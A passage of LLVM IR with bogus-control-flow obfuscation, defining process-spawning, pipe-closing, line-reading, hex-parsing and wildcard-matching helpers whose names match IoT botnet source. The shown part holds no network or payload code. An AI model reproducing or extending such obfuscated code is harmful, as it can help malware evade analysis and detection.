  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart218, label %originalBB1alteredBB

originalBBpart218:                                ; preds = %originalBB1
  br i1 %70, label %79, label %80

; <label>:79:                                     ; preds = %originalBBpart218
  store i32 -1, i32* %3, align 4
  br label %203

; <label>:80:                                     ; preds = %originalBBpart218
  %81 = load i32*, i32** @fdopen_pids, align 8
  %82 = bitcast i32* %81 to i8*
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = mul i64 %84, 4
  call void @llvm.memset.p0i8.i64(i8* %82, i8 0, i64 %85, i32 1, i1 false)
  br label %86

; <label>:86:                                     ; preds = %80, %originalBBpart2
  %87 = call i32 @vfork() #11
  store i32 %87, i32* %9, align 4
  switch i32 %87, label %179 [
    i32 -1, label %88
    i32 0, label %111
  ]

; <label>:88:                                     ; preds = %86
  %89 = load i32, i32* @x.19
  %90 = load i32, i32* @y.20
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %88
  %97 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %98 = load i32, i32* %97, align 4
  %99 = call i32 @close(i32 %98)
  %100 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @close(i32 %101)
  store i32 -1, i32* %3, align 4
  %103 = load i32, i32* @x.19
  %104 = load i32, i32* @y.20
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %203

; <label>:111:                                    ; preds = %86
  %112 = load i8*, i8** %5, align 8
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 114
  br i1 %115, label %116, label %147

; <label>:116:                                    ; preds = %111
  %117 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %118 = load i32, i32* %117, align 4
  %119 = icmp ne i32 %118, 1
  br i1 %119, label %120, label %127

; <label>:120:                                    ; preds = %116
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %122 = load i32, i32* %121, align 4
  %123 = call i32 @dup2(i32 %122, i32 1) #2
  %124 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %125 = load i32, i32* %124, align 4
  %126 = call i32 @close(i32 %125)
  br label %127

; <label>:127:                                    ; preds = %120, %116
  %128 = load i32, i32* @x.19
  %129 = load i32, i32* @y.20
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %127
  %136 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @close(i32 %137)
  %139 = load i32, i32* @x.19
  %140 = load i32, i32* @y.20
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %162

; <label>:147:                                    ; preds = %111
  %148 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %149 = load i32, i32* %148, align 4
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %151, label %158

; <label>:151:                                    ; preds = %147
  %152 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %153 = load i32, i32* %152, align 4
  %154 = call i32 @dup2(i32 %153, i32 0) #2
  %155 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %156 = load i32, i32* %155, align 4
  %157 = call i32 @close(i32 %156)
  br label %158

; <label>:158:                                    ; preds = %151, %147
  %159 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %160 = load i32, i32* %159, align 4
  %161 = call i32 @close(i32 %160)
  br label %162

; <label>:162:                                    ; preds = %158, %originalBBpart226
  %163 = load i32, i32* @x.19
  %164 = load i32, i32* @y.20
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %162
  call void @_exit(i32 127) #12
  %171 = load i32, i32* @x.19
  %172 = load i32, i32* @y.20
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  unreachable

; <label>:179:                                    ; preds = %86
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 114
  br i1 %183, label %184, label %190

; <label>:184:                                    ; preds = %179
  %185 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %186 = load i32, i32* %185, align 4
  store i32 %186, i32* %6, align 4
  %187 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @close(i32 %188)
  br label %196

; <label>:190:                                    ; preds = %179
  %191 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %192 = load i32, i32* %191, align 4
  store i32 %192, i32* %6, align 4
  %193 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @close(i32 %194)
  br label %196

; <label>:196:                                    ; preds = %190, %184
  %197 = load i32, i32* %9, align 4
  %198 = load i32*, i32** @fdopen_pids, align 8
  %199 = load i32, i32* %6, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i32, i32* %198, i64 %200
  store i32 %197, i32* %201, align 4
  %202 = load i32, i32* %6, align 4
  store i32 %202, i32* %3, align 4
  br label %203

; <label>:203:                                    ; preds = %196, %originalBBpart222, %79, %53, %30, %25
  %204 = load i32, i32* %3, align 4
  ret i32 %204

originalBBalteredBB:                              ; preds = %originalBB, %31
  %205 = load i32*, i32** @fdopen_pids, align 8
  %206 = icmp eq i32* %205, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %_ = sub i64 0, %208
  %gen = add i64 %_, 4
  %_2 = sub i64 0, %208
  %gen3 = add i64 %_2, 4
  %_4 = sub i64 0, %208
  %gen5 = add i64 %_4, 4
  %_6 = sub i64 %208, 4
  %gen7 = mul i64 %_6, 4
  %_8 = sub i64 0, %208
  %gen9 = add i64 %_8, 4
  %_10 = sub i64 0, %208
  %gen11 = add i64 %_10, 4
  %_12 = sub i64 0, %208
  %gen13 = add i64 %_12, 4
  %_14 = shl i64 %208, 4
  %_15 = sub i64 %208, 4
  %gen16 = mul i64 %_15, 4
  %209 = mul i64 %208, 4
  %210 = trunc i64 %209 to i32
  %211 = zext i32 %210 to i64
  %212 = call noalias i8* @malloc(i64 %211) #2
  %213 = bitcast i8* %212 to i32*
  store i32* %213, i32** @fdopen_pids, align 8
  %214 = icmp eq i32* %213, null
  br label %originalBB1

originalBB20alteredBB:                            ; preds = %originalBB20, %88
  %215 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %216 = load i32, i32* %215, align 4
  %217 = call i32 @close(i32 %216)
  %218 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %219 = load i32, i32* %218, align 4
  %220 = call i32 @close(i32 %219)
  store i32 -1, i32* %3, align 4
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %127
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %222 = load i32, i32* %221, align 4
  %223 = call i32 @close(i32 %222)
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %162
  call void @_exit(i32 127) #12
  br label %originalBB28
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %142

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %74, %20
  %29 = load i32, i32* @x.21
  %30 = load i32, i32* @y.22
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = load i32*, i32** @fdopen_pids, align 8
  %38 = load i32, i32* %3, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i32, i32* %37, i64 %39
  %41 = load i32, i32* %40, align 4
  %42 = call i32 @waitpid(i32 %41, i32* %7, i32 0)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* @x.21
  %44 = load i32, i32* @y.22
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %51

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %74

; <label>:54:                                     ; preds = %51
  %55 = load i32, i32* @x.21
  %56 = load i32, i32* @y.22
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = call i32* @__errno_location() #13
  %64 = load i32, i32* %63, align 4
  %65 = icmp eq i32 %64, 4
  %66 = load i32, i32* @x.21
  %67 = load i32, i32* @y.22
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %74

; <label>:74:                                     ; preds = %originalBBpart24, %51
  %75 = phi i1 [ false, %51 ], [ %65, %originalBBpart24 ]
  br i1 %75, label %28, label %76

; <label>:76:                                     ; preds = %74
  %77 = load i32, i32* @x.21
  %78 = load i32, i32* @y.22
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %86 = load i32*, i32** @fdopen_pids, align 8
  %87 = load i32, i32* %4, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  store i32 0, i32* %89, align 4
  %90 = load i32, i32* %8, align 4
  %91 = icmp eq i32 %90, -1
  %92 = load i32, i32* @x.21
  %93 = load i32, i32* @y.22
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %91, label %100, label %117

; <label>:100:                                    ; preds = %originalBBpart28
  %101 = load i32, i32* @x.21
  %102 = load i32, i32* @y.22
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %100
  %109 = load i32, i32* @x.21
  %110 = load i32, i32* @y.22
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %124

; <label>:117:                                    ; preds = %originalBBpart28
  %118 = bitcast %struct.in_addr* %9 to i32*
  %119 = load i32, i32* %7, align 4
  store i32 %119, i32* %118, align 4
  %120 = bitcast %struct.in_addr* %9 to i32*
  %121 = load i32, i32* %120, align 4
  %122 = and i32 %121, 65280
  %123 = ashr i32 %122, 8
  br label %124

; <label>:124:                                    ; preds = %117, %originalBBpart212
  %125 = phi i32 [ -1, %originalBBpart212 ], [ %123, %117 ]
  %126 = load i32, i32* @x.21
  %127 = load i32, i32* @y.22
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %124
  store i32 %125, i32* %2, align 4
  %134 = load i32, i32* @x.21
  %135 = load i32, i32* @y.22
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %142

; <label>:142:                                    ; preds = %originalBBpart216, %19
  %143 = load i32, i32* @x.21
  %144 = load i32, i32* @y.22
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  %151 = load i32, i32* %2, align 4
  %152 = load i32, i32* @x.21
  %153 = load i32, i32* @y.22
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret i32 %151

originalBBalteredBB:                              ; preds = %originalBB, %28
  %160 = load i32*, i32** @fdopen_pids, align 8
  %161 = load i32, i32* %3, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  %164 = load i32, i32* %163, align 4
  %165 = call i32 @waitpid(i32 %164, i32* %7, i32 0)
  store i32 %165, i32* %8, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %166 = call i32* @__errno_location() #13
  %167 = load i32, i32* %166, align 4
  %168 = icmp eq i32 %167, 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  %169 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %170 = load i32*, i32** @fdopen_pids, align 8
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i32, i32* %170, i64 %172
  store i32 0, i32* %173, align 4
  %174 = load i32, i32* %8, align 4
  %175 = icmp eq i32 %174, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %100
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %124
  store i32 %125, i32* %2, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  %176 = load i32, i32* %2, align 4
  br label %originalBB18
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %59, %originalBBpart2
  %26 = load i32, i32* @x.23
  %27 = load i32, i32* @y.24
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %15, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.23
  %37 = load i32, i32* @y.24
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %57

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* %16, align 4
  %46 = load i32, i32* %13, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %57

; <label>:48:                                     ; preds = %44
  %49 = load i8*, i8** %12, align 8
  %50 = load i32, i32* %16, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = getelementptr inbounds i8, i8* %52, i64 -1
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 10
  br label %57

; <label>:57:                                     ; preds = %48, %44, %originalBBpart24
  %58 = phi i1 [ false, %44 ], [ false, %originalBBpart24 ], [ %56, %48 ]
  br i1 %58, label %59, label %69

; <label>:59:                                     ; preds = %57
  %60 = load i32, i32* %14, align 4
  %61 = load i8*, i8** %12, align 8
  %62 = load i32, i32* %16, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  %65 = call i64 @read(i32 %60, i8* %64, i64 1)
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  %67 = load i32, i32* %16, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %16, align 4
  br label %25

; <label>:69:                                     ; preds = %57
  %70 = load i32, i32* %15, align 4
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %89

; <label>:72:                                     ; preds = %69
  %73 = load i32, i32* @x.23
  %74 = load i32, i32* @y.24
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %72
  %81 = load i32, i32* @x.23
  %82 = load i32, i32* @y.24
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:89:                                     ; preds = %69
  %90 = load i8*, i8** %12, align 8
  br label %91

; <label>:91:                                     ; preds = %89, %originalBBpart28
  %92 = phi i8* [ null, %originalBBpart28 ], [ %90, %89 ]
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %3
  %93 = alloca i8*, align 8
  %94 = alloca i32, align 4
  %95 = alloca i32, align 4
  %96 = alloca i32, align 4
  %97 = alloca i32, align 4
  store i8* %0, i8** %93, align 8
  store i32 %1, i32* %94, align 4
  store i32 %2, i32* %95, align 4
  store i32 1, i32* %96, align 4
  store i32 0, i32* %97, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %98 = load i32, i32* %15, align 4
  %99 = icmp eq i32 %98, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %72
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %30, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  %14 = load i32, i32* @x.25
  %15 = load i32, i32* @y.26
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %22 = load i32, i32* @x.25
  %23 = load i32, i32* @y.26
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %30, label %40

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i64, i64* %3, align 8
  %32 = shl i64 %31, 4
  %33 = load i8*, i8** %2, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %2, align 8
  %35 = load i8, i8* %33, align 1
  %36 = zext i8 %35 to i64
  %37 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %36
  %38 = load i64, i64* %37, align 8
  %39 = or i64 %32, %38
  store i64 %39, i64* %3, align 8
  br label %4

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.25
  %42 = load i32, i32* @y.26
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = load i64, i64* %3, align 8
  %50 = load i32, i32* @x.25
  %51 = load i32, i32* @y.26
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i64 %49

originalBBalteredBB:                              ; preds = %originalBB, %12
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %58 = load i64, i64* %3, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %86 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %53
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %108

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %49

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %47

; <label>:24:                                     ; preds = %19
  %25 = load i32, i32* @x.27
  %26 = load i32, i32* @y.28
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %4, align 8
  %34 = load i8*, i8** %5, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @wildString(i8* %33, i8* %35)
  %37 = icmp ne i32 %36, 0
  %38 = xor i1 %37, true
  %39 = load i32, i32* @x.27
  %40 = load i32, i32* @y.28
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2, %19
  %48 = phi i1 [ false, %19 ], [ %38, %originalBBpart2 ]
  br label %49

; <label>:49:                                     ; preds = %47, %13
  %50 = phi i1 [ true, %13 ], [ %48, %47 ]
  %51 = xor i1 %50, true
  %52 = zext i1 %51 to i32
